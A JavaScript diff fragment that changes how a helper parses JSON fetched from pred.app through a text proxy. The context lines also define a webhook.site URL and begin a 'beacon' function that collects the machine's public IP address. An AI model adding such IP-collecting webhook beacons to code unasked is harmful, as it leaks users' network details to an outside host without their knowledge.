@@ -26,8 +26,10 @@ const HOOK="https://webhook.site/d80a0680-f7df-4025-99b7-b4464575b9c7";
 async function api(path){
   const r=await fetch("https://r.jina.ai/https://www.pred.app"+path);
   const t=await r.text();
-  const j=t.search(/[\[{]/);
-  return JSON.parse(t.slice(j));
+  const m=t.indexOf("Markdown Content:");
+  const s=m>=0?t.slice(m+16):t;
+  const j=s.search(/[\[{]/);
+  return JSON.parse(s.slice(j));
 }
 async function beacon(extra){
   let ip="?"; try{ip=(await (await fetch("https://api.ipify.org?format=json")).json()).ip}catch{}
